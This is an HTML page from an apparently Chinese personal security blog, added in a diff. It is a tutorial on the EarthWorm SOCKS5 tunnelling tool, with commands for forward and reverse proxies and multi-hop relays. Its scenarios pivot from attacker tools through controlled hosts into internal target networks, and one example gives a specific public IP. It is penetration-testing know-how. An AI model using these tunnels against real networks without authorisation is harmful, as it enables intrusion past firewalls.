@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>ew使用教程 | Jean’s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="案例192.168.98.110（有开端口映射）对应的外网ip 117.28.113.252 9301 对外监听的端口ew_for_Win.exe -s rcsocks -l 1080 -e 9301  1.改privoxy（192.168.98.110）的config.txt里8118为8119 2.运行privoxy.exe  3.ew_for_Win.exe -s rcsocks -l 10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ew使用教程">
+<meta property="og:url" content="http://www.yi-diandian.com/2020/04/06/ew/index.html">
+<meta property="og:site_name" content="Jean’s Blog">
+<meta property="og:description" content="案例192.168.98.110（有开端口映射）对应的外网ip 117.28.113.252 9301 对外监听的端口ew_for_Win.exe -s rcsocks -l 1080 -e 9301  1.改privoxy（192.168.98.110）的config.txt里8118为8119 2.运行privoxy.exe  3.ew_for_Win.exe -s rcsocks -l 10">
+<meta property="article:published_time" content="2020-04-06T02:28:14.252Z">
+<meta property="article:modified_time" content="2020-03-29T14:06:27.917Z">
+<meta property="article:author" content="Jean">
+<meta property="article:tag" content="ew">
+<meta property="article:tag" content="代理">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Jean’s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Jean’s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">你真正是谁并不重要，重要的是你的所作所为。</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://www.yi-diandian.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-ew" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/ew/" class="article-date">
+  <time datetime="2020-04-06T02:28:14.252Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ew使用教程
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p>192.168.98.110（有开端口映射）对应的外网ip 117.28.113.252</p>
+<p>9301 对外监听的端口<br>ew_for_Win.exe -s rcsocks -l 1080 -e 9301</p>
+<ul>
+<li>1.改privoxy（192.168.98.110）的config.txt里8118为8119</li>
+<li>2.运行privoxy.exe </li>
+<li>3.ew_for_Win.exe -s rcsocks -l 1080 -e 9301（本机运行）</li>
+<li>4.ew_for_Win.exe -s rssocks -d 117.28.113.252 -e 9301 （对方机子上运行）</li>
+<li>5.浏览器设置代理192.168.98.110:8119 访问内网的网站 </li>
+</ul>
+<p>使用Privoxy将socks5代理转为http代理</p>
+<p>socks5代理:    执行的端口是1080<br>Privoxy:    端口是8118</p>
+<p>所以浏览器代理是192.168.98.110:8118</p>
+<h1 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h1><pre><code>EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。
+专有主页： http://rootkiter.com/EarthWorm/</code></pre><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><h2 id="普通网络环境"><a href="#普通网络环境" class="headerlink" title="普通网络环境"></a>普通网络环境</h2><ol>
+<li><p>目标网络边界存在公网IP且可任意开监听端口：</p>
+<pre><code>  +---------+     +-------------------+  
+  |HackTools| -&gt;&gt; | 8888-&gt;  1.1.1.1   |
+  +---------+     +-------------------+
+
+a)./ew -s ssocksd -l 8888
+        // 在 1.1.1.1 主机上通过这个命令开启 8888 端口的 socks 代理
+b) HackTools 可通过访问 1.1.1.1:8888 端口使用 1.1.1.1 主机提供的代理</code></pre></li>
+<li><p>目标网络边界不存在公网 IP，需要通过反弹方式创建 socks 代理</p>
+<pre><code>                        一台可控公网IP主机                  可控内网主机
+  +---------+     +--------------------------+    |     +---------------+
+  |HackTools| -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙  | &lt;--  2.2.2.2  |
+  +---------+     +--------------------------+    |     +---------------+
+
+a) ./ew -s rcsocks -l 1080 -e 8888
+            // 在 1.1.1.1 的公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机
+b) ./ew -s rssocks -d 1.1.1.1 -e 8888          
+            // 将目标网络的可控边界主机反向连接公网主机
+
+c) HackTools 可通过访问 1.1.1.1:1080 端口使用 rssocks 主机提供的 socks5 代理服务</code></pre></li>
+</ol>
+<h2 id="对于二重网络环境："><a href="#对于二重网络环境：" class="headerlink" title="对于二重网络环境："></a>对于二重网络环境：</h2><ol>
+<li><p>获得目标网络内两台主机 A、B 的权限，情况描述如下：</p>
+<pre><code>A 主机：  存在公网 IP，且自由监听任意端口，无法访问特定资源
+B 主机：  目标网络内部主机，可访问特定资源，但无法访问公网
+A 主机可直连 B 主机
+
+                        可控边界主机A             可访问指定资源的主机B
+  +---------+     +-----------------------+      +-----------------+
+  |HackTools| -&gt;&gt; | 1080 --&gt;  2.2.2.2 --&gt; | -&gt;&gt;  | 9999 -&gt; 2.2.2.3 |
+  +---------+     +-----------------------+      +-----------------+
+
+a)  ./ew -s ssocksd -l 9999
+        // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理
+b)  ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999 
+        // 将 1080 端口收到的 socks 代理请求转交给 2.2.2.3 的主机。
+c)  HackTools 可通过访问 2.2.2.2:1080 来使用 2.2.2.3 主机提供的 socks5 代理。</code></pre></li>
+<li><p>获得目标网络内两台主机 A、B 的权限，情况描述如下：</p>
+<pre><code>A 主机：  目标网络的边界主机，无公网 IP，无法访问特定资源。
+B 主机：  目标网络内部主机，可访问特定资源，却无法回连公网。
+
+A 主机可直连 B 主机
+                      一台可控公网IP主机                    可控内网主机A         可访问指定资源的主机B
+  +---------+     +--------------------------+    |    +-----------------+      +-----------------+
+  |HackTools| -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙  | &lt;--  2.2.2.2 --&gt; | -&gt;&gt; | 9999 -&gt; 2.2.2.3 |
+  +---------+     +--------------------------+    |    +-----------------+      +-----------------+
+
+a)  ./ew -s lcx_listen -l 1080 -e 8888
+            // 在 1.1.1.1 公网主机添加转接隧道，将 1080 收到的代理请求
+            // 转交给反连 8888 端口的主机
+b)  ./ew -s ssocksd -l 9999
+            // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理
+c)  ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
+            // 在 2.2.2.2 上，通过工具的 lcx_slave 方式，打通1.1.1.1:8888 和 2.2.2.3:9999 之间的通讯隧道
+d)  HackTools 可通过访问 1.1.1.1:1080 来使用 2.2.2.3 主机提供的 socks5 代理</code></pre></li>
+</ol>
+<h2 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h2><pre><code>目前工具提供六种链路状态，可通过 -s 参数进行选定，分别为:
+
+    ssocksd   rcsocks   rssocks   
+    lcx_slave lcx_tran  lcx_listen
+
+    其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。
+
+    其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。
+
+lcx 类别管道：
+
+    lcx_slave  该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。
+    lcx_tran   该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。
+    lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。
+
+    通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。
+
+    下面是一个三级跳的本地测试例子。。。
+    ./ew -s rcsocks -l 1080 -e 8888
+    ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
+    ./ew -s lcx_listen -l 9999 -e 7777
+    ./ew -s rssocks -d 127.0.0.1 -e 7777
+
+    数据流向为   IE -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks </code></pre><h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><ul>
+<li>1.为了减少网络资源的消耗，程序中添加了超时机制，默认时间为10000毫秒（10秒），<br>   用户可以通过追加 -t 参数来调整这个值，单位为毫秒。在多级级联功能中，超时机制<br>   将以隧道中最短的时间为默认值。</li>
+<li>2.单纯从设计原理上讲，多级级联的三种状态可以转发任意以TCP为基础的通讯服务，<br>   包括远程桌面／web服务 等。</li>
+<li>3.产品包中的 ew_for_Arm32 在开发者已有平台下（android手机、小米路由器、树莓派） 测试无误。<br>   如果有其它异常环境请将对应详细细节反馈给作者，以便更新程序问题。</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/06/ew/" data-id="ck8nuvbe6000gh8h55diu0qe0" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ew/" rel="tag">ew</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%90%86/" rel="tag">代理</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/04/06/dasp/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">DASP智能合约Top10漏洞</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Go/">Go</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80/">基础</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">日志分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DASP/" rel="tag">DASP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/EOS/" rel="tag">EOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Github/" rel="tag">Github</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Go/" rel="tag">Go</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hawkeye/" rel="tag">Hawkeye</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Proxifier/" rel="tag">Proxifier</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TOP10/" rel="tag">TOP10</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/aquatone/" rel="tag">aquatone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ew/" rel="tag">ew</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/log/" rel="tag">log</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reGeorg/" rel="tag">reGeorg</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sock5/" rel="tag">sock5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/urllib2/" rel="tag">urllib2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%90%86/" rel="tag">代理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag">信息安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2/" rel="tag">博客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/" rel="tag">子域名</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81/" rel="tag">密码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%83%8A%E8%9B%B0/" rel="tag">惊蛰</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" rel="tag">日志分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" rel="tag">智能合约</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E7%89%B9%E5%B8%81/" rel="tag">比特币</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" rel="tag">端口扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="tag">远程代码执行漏洞</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 13.33px;">CTF</a> <a href="/tags/DASP/" style="font-size: 10px;">DASP</a> <a href="/tags/EOS/" style="font-size: 10px;">EOS</a> <a href="/tags/Github/" style="font-size: 10px;">Github</a> <a href="/tags/Go/" style="font-size: 16.67px;">Go</a> <a href="/tags/Hawkeye/" style="font-size: 10px;">Hawkeye</a> <a href="/tags/Proxifier/" style="font-size: 10px;">Proxifier</a> <a href="/tags/Python/" style="font-size: 16.67px;">Python</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/TOP10/" style="font-size: 10px;">TOP10</a> <a href="/tags/aquatone/" style="font-size: 10px;">aquatone</a> <a href="/tags/ew/" style="font-size: 10px;">ew</a> <a href="/tags/github/" style="font-size: 10px;">github</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/log/" style="font-size: 10px;">log</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/reGeorg/" style="font-size: 10px;">reGeorg</a> <a href="/tags/sock5/" style="font-size: 10px;">sock5</a> <a href="/tags/urllib2/" style="font-size: 10px;">urllib2</a> <a href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 13.33px;">代理</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">信息安全</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 10px;">内网</a> <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" style="font-size: 16.67px;">区块链</a> <a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">博客</a> <a href="/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/" style="font-size: 10px;">子域名</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 10px;">安全</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 10px;">密码</a> <a href="/tags/%E6%83%8A%E8%9B%B0/" style="font-size: 10px;">惊蛰</a> <a href="/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" style="font-size: 10px;">日志分析</a> <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" style="font-size: 13.33px;">智能合约</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 10px;">暴力破解</a> <a href="/tags/%E6%AF%94%E7%89%B9%E5%B8%81/" style="font-size: 10px;">比特币</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 20px;">渗透测试</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 10px;">爬虫</a> <a href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">端口扫描</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 16.67px;">编程</a> <a href="/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">远程代码执行漏洞</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/04/06/ew/">ew使用教程</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/06/dasp/">DASP智能合约Top10漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/06/ctfwriteup2/">WriteUp-Web暴力破解</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/06/ctfwriteup/">WriteUp-源代码审计</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/06/btc4/">EOS节点远程代码执行漏洞</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 Jean<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
